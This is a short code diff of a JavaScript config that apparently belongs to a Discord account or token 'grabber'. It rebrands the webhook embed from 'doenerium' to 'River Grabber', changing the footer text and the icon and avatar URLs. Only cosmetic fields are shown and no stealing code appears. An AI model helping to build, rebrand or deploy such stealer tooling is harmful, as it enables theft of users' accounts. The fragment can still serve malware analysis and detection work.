@@ -23,13 +23,13 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "River Grabber",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `west & afro`,
+            icon_url: "https://cdn.discordapp.com/attachments/1081261878795317270/1087004884294967366/533720-middle.png",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "west & afro",
+        avatar_url: "https://cdn.discordapp.com/attachments/1081261878795317270/1087004884294967366/533720-middle.png"
     },
 
     badges: {
